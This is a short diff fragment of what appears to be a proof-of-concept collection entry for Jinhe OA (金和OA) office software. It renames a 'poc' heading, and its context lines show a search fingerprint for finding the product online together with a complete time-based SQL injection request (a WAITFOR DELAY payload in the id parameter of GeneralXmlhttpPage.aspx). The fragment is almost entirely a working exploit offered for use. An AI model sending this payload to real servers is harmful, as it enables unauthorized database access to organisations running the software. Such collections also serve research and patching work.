@@ -9,7 +9,7 @@ app="金和网络-金和OA"
 ```
 
 
-## poc
+## POC
 
 ```
 GET /C6/Jhsoft.Web.appraise/GeneralXmlhttpPage.aspx/?type=CheckAppraiseState&id=1'%3b+WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
